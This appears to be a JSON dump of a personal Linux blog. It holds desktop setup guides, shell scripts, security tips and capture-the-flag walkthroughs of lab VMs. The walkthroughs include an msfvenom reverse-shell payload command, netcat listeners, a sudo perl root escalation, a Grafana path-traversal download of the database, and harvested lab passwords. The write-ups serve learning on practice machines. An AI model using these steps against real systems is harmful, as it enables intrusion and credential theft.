startup.I can add other panels but I can’t remove the last one,so I made an empty and tinny panel with 100% opacity, he is in the corner of my screen.I feel like I’m not doing it right xD. IsuesAfter a reboot, et was broken, dmenu, bspwm, nitrogen and plybar was gone.And the shortcuts don’t work too, I had to open a terminal to fix it.Right click on the desktop &gt; terminal &gt; kill xfce4wm &gt; statr bspwm.This is how it’s look like. I fix my problem with polybar, I had something wrong in the config file.now I have to fix netrogen.I’m gonna reboot to see if it really work.And still not working. bspwm dmenu shortcutsRight click on the desktop &gt; terminal &gt; kill xfce4wm &gt; statr bspwm.dmenu and the shortcuts start with dmenu. nitrogenI had to kill xfce4 desktop, now nitrogen can run PicomThe blur was gone too, I have to set in at startup. polybarpolybar: error while loading shared libraries: libjsoncpp.so.24: cannot open shared object file: No such file or directory I have to rebuild it. git clone https:&#x2F;&#x2F;aur.archlinux.org&#x2F;polybar.git &amp;&amp; cd polybar &amp;&amp; makepkg -si This is how it should look like.I’m gonna reboot.And polybar don’t want to start, I should start it with an another startup file.And if it really don’t work I’m gonna create a service and enable it.Like the arch wiki said I had do modify the bspwmrc. ~.config/bspwm/bspwmrc $HOME&#x2F;.config&#x2F;polybar&#x2F;launch.sh Minor ProblemsNow I have an another problem, it’s working fine but it’s ugly.nitrogen restore the same wallpaper, no matter what, and the polybar don’t fetch the colors.I’ve created a commmand to set a random wallpaper. /usr/local/bin/rwalp ran&#x3D;$(find ~&#x2F;Pictures -type f \\( -iname \\*.jpg -o -iname \\*.png \\) | shuf -n 1) nitrogen --set-scaled &quot;$ran&quot; wal -i &quot;$ran&quot; pywalfox update Now I have to set rwalp at startup, I’m gonna use the bspwmrc file.The background don’t change, but everything else is ok, and I can change the background if I reload bspwm with CTRL+ALR+r, I love it.","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Script to create my article page.","slug":"Script_to_create_my_article_page","date":"2022-01-11T21:30:34.000Z","updated":"2022-09-27T07:49:09.828Z","comments":true,"path":"/post/Script_to_create_my_article_page.html","link":"","permalink":"https://peanutstick.github.io/post/Script_to_create_my_article_page.html","excerpt":"","text":"WhyI wanted to automate the creation of the base page for my articles.My script ask for the title and the categorie only.He fill the date automaticly and that’s good, because sometimes I don’t change it. ScriptIt’s basic. #!&#x2F;bin&#x2F;bash items&#x3D;(&quot;CTF&quot; &quot;Fix&quot; &quot;Os&quot; &quot;Other&quot; &quot;Programing&quot; &quot;Security&quot; &quot;Service&quot; &quot;Tips&quot;) i&#x3D;1 date&#x3D;$(date &#39;+%Y-%m-%d %H:%M:%S&#39;) echo -n &quot;Title: &quot; read title echo $title titlemd&#x3D;$&#123;title&#x2F;&#x2F; &#x2F;_&#125;.md clear for elements in &quot;$&#123;items[@]&#125;&quot; do echo &quot;$i) $elements&quot; ((i++)) done echo -e &quot;What is the categorie?&quot; echo -n &quot;: &quot; read choix #echo $&#123;items[$choix-1]&#125; #echo $date echo &quot;---&quot; &gt; $titlemd echo &quot;layout: post&quot; &gt;&gt; $titlemd echo &quot;title: $title&quot; &gt;&gt; $titlemd echo &quot;date: $date -0600&quot; &gt;&gt; $titlemd echo &quot;categories: $&#123;items[$choix-1]&#125;&quot; &gt;&gt; $titlemd echo &quot;tags: Linux&quot; &gt;&gt; $titlemd echo &quot;---&quot; &gt;&gt; $titlemd","categories":[{"name":"Programing","slug":"Programing","permalink":"https://peanutstick.github.io/categories/Programing/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Cut an online video with ffmpeg","slug":"Cut_an_online_video_with_ffmpeg","date":"2022-01-11T02:15:52.000Z","updated":"2023-02-05T12:59:00.131Z","comments":true,"path":"/post/Cut_an_online_video_with_ffmpeg.html","link":"","permalink":"https://peanutstick.github.io/post/Cut_an_online_video_with_ffmpeg.html","excerpt":"","text":"Why ffmpegThis tool can decode a video and re-encode it.You can remove the audio or the video, change the codec or use it to stream a file. TrickYou can input a youtube video without downloading it, to do this you need youtube-dl. youtube-dl -f best --get-url https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;H8w_Q57RQJc https:&#x2F;&#x2F;rr3---sn-n4g-ouxs.googlevideo.com&#x2F;videoplayback?expire&#x3D;1641865369&amp;ei&#x3D;OYzcYZ7yKNuMxN8P7feTIA&amp;ip&#x3D;93.23.130.72&amp;id&#x3D;o-AO5ZLYd00XMxzT1PjKh0Grtrh-mtnzmQcTys0s1Fx-UI&amp;itag&#x3D;18&amp;source&#x3D;youtube&amp;requiressl&#x3D;yes&amp;mh&#x3D;Q-&amp;mm&#x3D;31%2C29&amp;mn&#x3D;sn-n4g-ouxs%2Csn-n4g-jqbed&amp;ms&#x3D;au%2Crdu&amp;mv&#x3D;m&amp;mvi&#x3D;3&amp;pl&#x3D;21&amp;initcwndbps&#x3D;1763750&amp;vprv&#x3D;1&amp;mime&#x3D;video%2Fmp4&amp;ns&#x3D;R-N0c7jT-8ZOyFPbWVfuYpAG&amp;gir&#x3D;yes&amp;clen&#x3D;139964871&amp;ratebypass&#x3D;yes&amp;dur&#x3D;6538.507&amp;lmt&#x3D;1540303910458790&amp;mt&#x3D;1641842946&amp;fvip&#x3D;5&amp;fexp&#x3D;24001373%2C24007246&amp;c&#x3D;WEB&amp;txp&#x3D;5531432&amp;n&#x3D;tXjNIa-Hi2X8YEz&amp;sparams&#x3D;expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&amp;sig&#x3D;AOq0QJ8wRgIhAPRj1ix2t8yS_B3M3QQaY0dCz4l-AaDkvF4r-sutJ50_AiEAk_E3dott1d4QWuDUqQkcSPtBRzIQi-rcNVeOV4Fg53E%3D&amp;lsparams&#x3D;mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig&#x3D;AG3C_xAwRQIgJInz5xNfosh2ocbFn41qMlAjCzdgTG0Xu3FjciwFCTkCIQCl7Jn3sVBFAmEnfXFmdH4k35tRXbMBB406wbAnyOLElQ%3D%3D If you click on the big link you can see the video without the youtube things. now ffmpeg can read the video with this link. The command to get the youtube link is too big, so I’m gonna wrap it into a variable. link&#x3D;$(youtube-dl -f best --get-url https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;H8w_Q57RQJc) ffmpeg -i $link output.mp3 My ideaI wanted to download every song in one youtube video, it was a pretty bad idea…For exemple I wanted the full Album of VA-11 HALL-A.I had to enter every title and every time code one by one.I made the script in one afternoon and I took some time to understand how the programe work. So, to download a specific moment of the video you have to use -ss with ffmpeg to indicate when it start,and use t for the duration or to for the next time code. ffmpeg -i &quot;$vid&quot; \\ -ss 0 -to 120 &quot;output.mp3&quot; So with it you can pick the song you like in theres lists on youtube. My scriptThis is my script, you have to guess how to use it, lol.It’s made by a pro so it will be easy ( ͡° ͜ʖ ͡°). vid&#x3D;$(youtube-dl -f best --get-url $1) listtime&#x3D;(&quot;0&quot;) listtitle&#x3D;() i&#x3D;0 while true do echo -e &quot;The end: &quot; read time echo -e &quot;The title: &quot; read title title&#x3D;str&#x3D;&quot;$&#123;title&#x2F;&#x2F; &#x2F;_&#125;&quot; listtime+&#x3D;(&quot;$time&quot;) listtitle+&#x3D;(&quot;$title&quot;) echo -e &quot;1: Continue &quot; echo -e &quot;2: Start download&quot; echo -n &quot;: &quot; read choix case $choix in 1) clear ;; 2) echo -n &quot;bye&quot; clear break ;; esac done i&#x3D;0 while [ $i -ne $&#123;#listtitle[@]&#125; ] do title&#x3D;$&#123;listtitle[$i]&#125; start&#x3D;$&#123;listtime[$i]&#125; ((i++)) end&#x3D;$&#123;listtime[$i]&#125; title&#x3D;$&#123;title:4&#125; ffmpeg -i &quot;$vid&quot; \\ -ss $start -to $end &quot;$&#123;title&#125;.mp3&quot; done EndDon’t do what I’ve done, it’s useless, it’s faster to download the musics on 1337 or somewhere else.you can use it if you like a song and want to pick this one amoug every songs.","categories":[{"name":"Tips","slug":"Tips","permalink":"https://peanutstick.github.io/categories/Tips/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Create a locale stream","slug":"Stream_audio_video_at_home","date":"2022-01-09T18:18:22.000Z","updated":"2022-09-27T07:49:10.934Z","comments":true,"path":"/post/Stream_audio_video_at_home.html","link":"","permalink":"https://peanutstick.github.io/post/Stream_audio_video_at_home.html","excerpt":"","text":"WhyBecause we can’t use the music bot on discord anymore.And a youtuber released a video yesterday where he show how to steal a stream on youtube, it’s Bugswriter.I don’t want to steal a stream, I just want to use ffmpeg like a chad and play with it. HowI want to use ffmpeg without ffserver, because ffserver has been removed on 2018-01-06.And a webserver, I tried with python SimpleHTTPServer but I can’t use it because I have the error 501.message Unsupported method (&#39;POST&#39;)SO I’m gonna use nginx What I’v doneCreate the web server.Upload the stream: ffmpeg -i weeb_music.webm -f mp3 &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;stream I don’t stream to http://localhost:80/stream because it’s not working well.And if I can do it, everyone can do it too and it’s not good.Maybe it’s possible to upload a revershell via ffmpeg and I will be fucked.So you can only read via the web server. ProblemsWhen I start the stream, he upload it very fast (50x).The output is not a stream but juste the file. If the file is loaded at 100% in my browser he will stop the download.But if it’s the half of the music the browser wont load the rest of the stream. What I should tryReduce the speed.Don’t erase the buffer because youtube don’t do it to,maybe I can create an index.html and embed the stream.Don’t use a file but a real stream, like the output of my browser or a video/music player.Use the stream of MCP server??I have to open the ports of my box, not the 80 or 8080 because of the bots.Read the stream with vlc and ffplayer.","categories":[{"name":"Service","slug":"Service","permalink":"https://peanutstick.github.io/categories/Service/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF_SickOs","slug":"CTF_SickOs","date":"2022-01-09T00:15:52.000Z","updated":"2022-09-27T07:49:10.864Z","comments":true,"path":"/post/CTF_SickOs.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_SickOs.html","excerpt":"","text":"Discovery[https://www.vulnhub.com/entry/sickos-11,132/] DescriptionThis CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment.This vm is very similar to labs I faced in OSCP.The objective being to compromise the network/machine and gain Administrative/root privileges on them. Objective…: Get /root/a0216ea4d51874464078c618298b1367.txt Scanningnetdiscoversudo netdiscover nmap Exploithttp-proxy Squid http proxy 3.1.19 [https://www.exploit-db.com/exploits/9951]Let’s use Metasploit. sudo msfconsole search squid Use the proxyI dont set the proxy in my browser because I want to try the dirbuster. export http_proxy&#x3D;&#39;http:&#x2F;&#x2F;192.168.0.26:3128&#39; curl http:&#x2F;&#x2F;192.168.0.26 gobustergobuster dir -x * -u http:&#x2F;&#x2F;192.168.0.26 -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt /index (Status: 200) [Size: 21]/connect (Status: 200) [Size: 109]/robots (Status: 200) [Size: 45]/server-status (Status: 403) [Size: 293] connect is a python file 1 #!/usr/bin/python 2 3 print \"I Try to connect things very frequently\\n\" 4 print \"You may want to try my services\" I don’t know what to do with it. In robots.txt User-agent: * Disallow: &#x2F; Dissalow: &#x2F;wolfcms Let’s see what is wolfcms and see if we can exploit it.https://www.exploit-db.com/exploits/38000 http:&#x2F;&#x2F;192.168.0.26&#x2F;wolfcms&#x2F;?&#x2F;admin&#x2F;plugin&#x2F;file_manager&#x2F;browse&#x2F; Now we have a login page, let’s try with admin/admin. metasploitI’m gonna upload a revers shell, usualy I use thoses from pentestmonkey with netcat, but this time I’m gonna use metasploit. msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.21 LPORT&#x3D;4444 -f raw -o shell.php And upload the shell.php in the website. Run msfconsole to start the listener: use exploit&#x2F;multi&#x2F;handler set LHOST &lt;$LOCAL_IP&gt; set LPORT &lt;$LOCAL_PORT&gt; set PAYLOAD php&#x2F;meterpreter&#x2F;reverse_tcp exploit I don’t know where is my error, I just want a shell so bye bye metasploit. Reverse shellI’m gonna download the reverse shell from pentestmonkey.[https://github.com/pentestmonkey/php-reverse-shell]And change the values.you can also replace the shell.[https://netsec.ws/?p=337] Upload the shell and listen with netcat. netcat -nlvp 4444 let’s upgrade the shell with this. python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; ReconLet’s upload the LinEnum script and run it.I want to create a txt file because it’s hard to read.It’s too hard to read I’m gonna find something else.[https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh]I like this one, there is lot of colors.I think I foud it.We can edit connect.py to open a revershell with an another port,and listen with netcatIt’s not working, let’s see more informations.Ok this file is not for now, I think I have to find the user first, not the root. cat &#x2F;var&#x2F;www&#x2F;wolfcms&#x2F;config.php &#x2F;&#x2F; Database settings: define(&#39;DB_DSN&#39;, &#39;mysql:dbname&#x3D;wolf;host&#x3D;localhost;port&#x3D;3306&#39;); define(&#39;DB_USER&#39;, &#39;root&#39;); define(&#39;DB_PASS&#39;, &#39;john@123&#39;); define(&#39;TABLE_PREFIX&#39;, &#39;&#39;); The user is not working for root, but for sickos it’s good. ssh sickos@192.168.0.26 john@123 Now I’m gonna run the enumeration script with the user sickOS sudo su I’m root. )","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Dinae","slug":"CTF_Dina","date":"2022-01-08T21:16:52.000Z","updated":"2022-09-27T07:49:09.551Z","comments":true,"path":"/post/CTF_Dina.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Dina.html","excerpt":"","text":"Discoveryhttps://www.vulnhub.com/entry/dina-101,200/ DescriptionWelcome to Dina 1.0.1 _-——-_ ___ _———-/_/ _-—\\\\\\ // _ \\ //////——-// _-—\\|| (( | ))) ||//——// __-–\\ ((\\ = / ))) //—-/_/ _--_))) \\ )))—// _/ ((( (((_/ | -))) - )) This is my first Boot2Root - CTF VM. I hope you enjoy it. if you run into any issue you can find me on Twitter: @touhidshaikh22 Contact: touhidshaikh22 at gmaill.com &lt;- Feel Free to write mail Website: http://www.touhidshaikh.com Goal: /root/flag.txt Level: Beginner (IF YOU STUCK ANYwhere PM me for HINT, But I don’t think need any help). Download: https://drive.google.com/file/d/0B1qWCgvhnTXgNUF6Rlp0c3Rlb0k/view Try harder!: If you are confused or frustrated don’t forget that enumeration is the key! Feedback: This is my first boot2root - CTF Virtual Machine, please give me feedback on how to improve! Tested: This VM was tested with: Virtual Box 5.X Networking: DHCP service: Enabled IP address: Automatically assign Fixing: Some challenge issue reported by @eliot Looking forward to the write-ups!Doesn’t work with VMware. Virtualbox only. v1 - 10/07/2017 v1.0.1 - 17/10/2017 Scaanningnetdiscoversudo netdiscover 192.168.0.27 nmapOnly the port 80 iss open. sudo nmap 192.168.0.27 -sV -p- gobustergobuster dir -x * -u http:&#x2F;&#x2F;192.168.0.27 -w Documents&#x2F;wordlist&#x2F;directory-list-common.txt /cgi-bin/ (Status: 403) [Size: 288]/index (Status: 200) [Size: 3618]/secure (Status: 301) [Size: 313] [–&gt; http://192.168.0.27/secure/]/tmp (Status: 301) [Size: 310] [–&gt; http://192.168.0.27/tmp/]/uploads (Status: 301) [Size: 314] [–&gt; http://192.168.0.27/uploads/] In secure we have a zip file.And in this zip file we have a file “backup-cred.mp3”I can’t extract ip because there is a password. In index we have this page, with a buton “submit query” In the robots.txt we have something.User-agent: *Disallow: /ange1Disallow: /angel1Disallow: /nothingDisallow: /tmpDisallow: /uploads In Nothing, in the code source we have this. my secret passfreedompasswordhelloworld!dianailoveroot Freedom is the password of “backup cred.mp3” It’s a text file. I am not toooo smart in computer …….dat the resoan i always choose easy password…with creds backup file…. uname: touhidpassword: ****** url : /SecreTSMSgatwayLogin% Let’s see what is it. The username should be touhid, let’s try every password is the txt file.The password is diana.In the code source we have this.kurakura cinta kamu.......sampai mati...I wanted to see the version of the web app to exploit it but I can’t find it.The application is `playSMS Exploithttps://www.exploit-db.com/exploits/44598 I’m gonna use this one with metasploit.I had to install kali linux because I have an error with Arch Linux (Yeah I use it,BTW).The &quot;shell&quot; command is not supported by this Meterpreter type (php/php)I will fix the error later.Resolution scale goes BBRRrrrrrrrrr.I upgrade my shell with /bin/sh -ihttps://netsec.ws/?p=337 sudo -l to see what I can do, I also search in the home directory but there is nothing interesting.So I can run perl as root without password.https://gtfobins.github.io/gtfobins/perl/I’m gonna try the first one. sudo perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39; Nice.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Weather in CLI","slug":"weather","date":"2022-01-06T17:15:52.000Z","updated":"2022-09-27T07:49:10.071Z","comments":true,"path":"/post/weather.html","link":"","permalink":"https://peanutstick.github.io/post/weather.html","excerpt":"","text":"Help[https://wttr.in/:help] usagecurl fr.wttr.in","categories":[{"name":"Tips","slug":"Tips","permalink":"https://peanutstick.github.io/categories/Tips/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Switch from i3 to bspwm","slug":"switch_from_i3_to_bspwm","date":"2022-01-01T00:37:52.000Z","updated":"2022-09-27T07:49:11.041Z","comments":true,"path":"/post/switch_from_i3_to_bspwm.html","link":"","permalink":"https://peanutstick.github.io/post/switch_from_i3_to_bspwm.html","excerpt":"","text":"Why bspwm.Because I had some issues with discord, it was slow and i3 is pretty old.I wanted to try something else. How I installled bspwm.Install bspwmsudo pacman -S bspwm Create the config filesinstall -Dm755 &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bspwm&#x2F;examples&#x2F;bspwmrc ~&#x2F;.config&#x2F;bspwm&#x2F;bspwmrc install -Dm644 &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bspwm&#x2F;examples&#x2F;sxhkdrc ~&#x2F;.config&#x2F;sxhkd&#x2F;sxhkdrc sxhkdrc is used to create the shortcuts. I had to launch bspwm and disable i3.I’ve done it in the xfce pannel instead of ‘/etc/X11/xinit/xinitrc’, because it was not working and I like how I can do it with xfce. Sxhkd config# # wm independent hotkeys # # terminal emulator super + Return kitty # program launcher super + d dmenu_run # make sxhkd reload its configuration files: super + Escape pkill -USR1 -x sxhkd # # bspwm hotkeys # # quit&#x2F;restart bspwm super + alt + &#123;q,r&#125; bspc &#123;quit,wm -r&#125; # close and kill super + &#123;_,shift + &#125;w bspc node -&#123;c,k&#125; # alternate between the tiled and monocle layout super + m bspc desktop -l next # send the newest marked node to the newest preselected node super + y bspc node newest.marked.local -n newest.!automatic.local # swap the current node and the biggest window # # state&#x2F;flags # # set the window state super + &#123;t,shift + t,s,f&#125; bspc node -t &#123;tiled,pseudo_tiled,floating,fullscreen&#125; # # focus&#x2F;swap # # focus the node in the given direction super + &#123;_,shift + &#125;&#123;Left,Down,Up,Right&#125; bspc node -&#123;f,s&#125; &#123;west,south,north,east&#125; # focus the node for the given path jump super + &#123;p,b,comma,period&#125; bspc node -f @&#123;parent,brother,first,second&#125; # focus the last node&#x2F;desktop super + &#123;grave,Tab&#125; bspc &#123;node,desktop&#125; -f last super + &#123;_,shift + &#125;&#123;1-9,0&#125; bspc &#123;node -d, desktop -f&#125; &#39;^&#123;1-9,10&#125;&#39; #super + &#123;_,shift + &#125;&#123;1-9,0&#125; # bspc node -d &#39;^&#123;1-9,10&#125;&#39; super + &#123;ampersand,eacute,quotedbl,apostrophe,parenleft,section,egrave,exclam,ccedilla&#125; bspc desktop -f &#39;^&#123;1-9,10&#125;&#39; # bscp desktop -f &#123;1-9,10&#125; alt + shift + &#123;Left,Right,Up,Down&#125; dir&#x3D;&#123;west,east,north,south&#125;; \\ bspc node -s &quot;$dir.local&quot; --follow \\ || bspc node -m &quot;$dir&quot; --follow # # preselect # # preselect the direction super + ctrl + &#123;Left,Down,Up,Right&#125; bspc node -p &#123;west,south,north,east&#125; # preselect the ratio super + ctrl + &#123;1-9&#125; bspc node -o 0.&#123;1-9&#125; # cancel the preselection for the focused node super + ctrl + space bspc node -p cancel # # move&#x2F;resize # # expand a window by moving one of its side outward super + alt + &#123;Left,Down,Up,Right&#125; bspc node -z &#123;Left -20 0,bottom 0 20,top 0 -20,right 20 0&#125; # contract a window by moving one of its side inward super + alt + shift + &#123;Left,Down,Up,Right&#125; bspc node -z &#123;right -20 0,top 0 20,bottom 0 -20,left 20 0&#125; # move a floating window super + &#123;Left,Down,Up,Right&#125; bspc node -v &#123;-20 0,0 20,0 -20,20 0&#125; Bspwm config#! &#x2F;bin&#x2F;sh pgrep -x sxhkd &gt; &#x2F;dev&#x2F;null || sxhkd &amp; bspc monitor -d 1 2 3 4 5 bspc config border_width 2 bspc config window_gap 12 bspc config split_ratio 0.52 bspc config borderless_monocle true bspc config gapless_monocle true bspc rule -a Gimp desktop&#x3D;&#39;^8&#39; state&#x3D;floating follow&#x3D;on bspc rule -a Chromium desktop&#x3D;&#39;^2&#39; bspc rule -a mplayer2 state&#x3D;floating bspc rule -a Kupfer.py focus&#x3D;on bspc rule -a Screenkey manage&#x3D;off","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Fix my spyware is stuck in the login loop (Microsoft teams)","slug":"Fix_teams","date":"2021-12-27T20:15:52.000Z","updated":"2022-09-27T07:49:09.948Z","comments":true,"path":"/post/Fix_teams.html","link":"","permalink":"https://peanutstick.github.io/post/Fix_teams.html","excerpt":"","text":"ProblemMy problem is in the title, I can’t use teams because I’m stuck in the login loop.It’s the same with the apps From the AUR, teams and teams for linux. Solution 1Clear the config file.Not working for me. rm -r ~&#x2F;.config&#x2F;teams-for-linux rm -r ~&#x2F;.config&#x2F;Microsoft&#x2F; Try via the browserNop still the same Change the dateI’s the solution for me, it’s weird because I had the right date/time.On discord (an another spyware) the time was wrong too. The NTP was inactive. timedatectl set-ntp true systemctl start systemd-timesyncd.service systemctl enable systemd-timesyncd.service timedatectl set-timezone Europe&#x2F;Paris I set Europe/Paris because I’m french.","categories":[{"name":"Fix","slug":"Fix","permalink":"https://peanutstick.github.io/categories/Fix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"How do I setup nitrogen & pywal","slug":"nitrogen_with_wal","date":"2021-12-25T02:15:52.000Z","updated":"2022-09-27T07:49:11.034Z","comments":true,"path":"/post/nitrogen_with_wal.html","link":"","permalink":"https://peanutstick.github.io/post/nitrogen_with_wal.html","excerpt":"","text":"What I wantI want to change my background and the color of my terminal with one command. RequirementNitrogensudo pacman -S nitrogen pyWalYou can found it on the AUR.I’m gonna use yay to install it.you can also use wal for discord and spotify.yay -Ss pywalLet’s install it.yay -S python-pywal Aliascommand for nitrogentnitrogen --set-auto image.png Command for pywalwal -i image.png Script itThe name of the alias will be walp.In my .zshrc walp()&#123; nitrogen --set-auto &quot;$1&quot; wal -i &quot;$1&quot; &#125; usage:walp image.jpg Set nitrogen at startupI’m going to edit .config/i3/config because I’m using i3 exec --no-startup-id nitrogen --restore","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Setup_Xfce_with_i3","slug":"Setup_Xfce_with_i3","date":"2021-12-24T04:17:00.000Z","updated":"2022-09-27T07:49:09.678Z","comments":true,"path":"/post/Setup_Xfce_with_i3.html","link":"","permalink":"https://peanutstick.github.io/post/Setup_Xfce_with_i3.html","excerpt":"","text":"I have a basic install of Xfce. I also can open a new session with only i3. Install nitrogensudo pacman -S nitrogenIt will repalce the background, for the wallpaper.I don’t know what I’m currently using for my current setup with i3,but it’s not nitrogen. Remove Xfce wmGo to session &amp; startup.on the second tab you have to set i3 at startup.on the third tab, select never for xfwm4 and xfcedesktop.And remove all shortcuts in xfce, because you gonna have some problems with thoses of i3.And reboot. And voila","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Set up a firewall with ufw","slug":"Set_firewall_ufw","date":"2021-11-01T19:05:52.000Z","updated":"2022-09-27T07:49:09.874Z","comments":true,"path":"/post/Set_firewall_ufw.html","link":"","permalink":"https://peanutstick.github.io/post/Set_firewall_ufw.html","excerpt":"","text":"Installapt install ufw ConfigDoc: https://help.ubuntu.com/community/UFW The best things to do is disable all the port and enable only what you need.sudo ufw default denyBe carefull, if you are connected via ssh you should enable the port first.sudo ufw allow 22It’s 22 for the exemple, but you have to change the port to avoid attacks from Chinese bots. To see your open port you can use netstat.sudo netstat -tulpnAnd then allow what you need. If the config is done you can enable the service.sudo ufw enable","categories":[{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/categories/Security/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/tags/Security/"}]},{"title":"Set up port knocking server to hide an open port","slug":"Port_knocking","date":"2021-10-30T23:15:52.000Z","updated":"2022-09-27T07:49:09.784Z","comments":true,"path":"/post/Port_knocking.html","link":"","permalink":"https://peanutstick.github.io/post/Port_knocking.html","excerpt":"","text":"What is Port Knocking ?Port knocking is a simple method to grant remote access without leaving a port constantly open.This preserves your server from port scanning and script kiddie attacks. Server SetupInstall the packageDebian: apt install knockd Configuration/etc/knockd.conf I want to hide the ssh.You have to change the sequence, because the script kiddies will try this sequence first. [options] logfile &#x3D; &#x2F;var&#x2F;log&#x2F;knockd.log [SSH] sequence &#x3D; 7000,8000,9000 seq_timeout &#x3D; 20 command &#x3D; &#x2F;sbin&#x2F;iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags &#x3D; syn cmd_timeout &#x3D; 10 stop_command &#x3D; &#x2F;sbin&#x2F;iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT You have some exemple here. ubuntu.com Enable the deamon/etc/default/knockdUncomment the START_KNOCKD=1 line to enable the daemon. ################################################ # # knockd&#39;s default file, for generic sys config # ################################################ # control if we start knockd at init or not # 1 &#x3D; start # anything else &#x3D; don&#39;t start START_KNOCKD&#x3D;1 # command line options KNOCKD_OPTS&#x3D;&quot;-i eth0&quot; Client sideLinuxYou should install knockd on the client too.knock -v 192.168.1.250 7000 8000 9000 WindowsDownload this: SourceForge-KnockKnockYou sould read the README.txtKnockKnock.zip - archive containing all files|- Shortcut to KnockKnock - Shortcut to knock client||- Shortcut to KnockMonitor - Shortcut to knock server","categories":[{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/categories/Security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Ambassador","slug":"CTF_Ambassador","date":"2021-10-10T01:09:05.000Z","updated":"2022-10-11T15:18:06.298Z","comments":true,"path":"/post/CTF_Ambassador.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Ambassador.html","excerpt":"","text":"Rustscanrustscan -a ambassador.htb --ulimit 5000 Website on port 80 Website on port 3000Grafana version 8.2.0CVE-2021-43798https://www.exploit-db.com/exploits/50581So, I had to download it and run it like this: python3 50581.py -H http://ambassador.htb:3000 Then, select the file I want to read (ex: /etc/passwd)./etc/grafana/grafana.ini default admin user, created on startup ;admin_user &#x3D; admin default admin password, can be changed before first start of grafana, or in profile settings admin_password &#x3D; messageInABottle685427 used for signing ;secret_key &#x3D; SW2YcwTIb9zpOOhoPsMm I’m in, I’m listing the plugins, maybe I can upload a revers shell on it.Maybe the interesting to do was searching the files with the last exploit. I have to find the password. curl --path-as-is http://ambassador.htb:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db sqlite3 grafana.db I need to find the creds of grafana to login the mysql database. SELECT * FROM data_source; 2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|&#123;&#125;|2022-09-01 22:43:03|2022-10-08 20:21:56|0|&#123;&#125;|1|uKewFgM4z Password = dontStandSoCloseToMe63221!| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | ssh618dafc87c795ef87e5f672b4a3902a4anEnglishManInNewYork027468","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF M0rsarchive","slug":"CTF_M0rsarchive","date":"2021-10-10T01:09:05.000Z","updated":"2022-10-16T20:18:47.309Z","comments":true,"path":"/post/CTF_M0rsarchive.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_M0rsarchive.html","excerpt":"","text":"CHALLENGE DESCRIPTIONJust unzip the archive … several times … Zip fileWe have an encrypted Zip file: flag_999.zip.And a picture:It’s a morse code, it’s mean 9.The password of flag_999.zip should be 9.So we have 999 zip files like this, I have to code something. Get the hex value of a pngconvert *.png txt:- There is 2 colors, #BC32D8 for the background and #FF3200 for the foreground. convert *.png txt:- > hex.txt grep \"#FF3200\" -C 1 hex.txt If there is 3 pixels it’s a -, if there is 1 pixel it’s a .and the – is a pace.The code should be 98. Convert to morsegrep \"#FF3200\" -C 1 hex.txt | awk '&#123; print $3 &#125;' 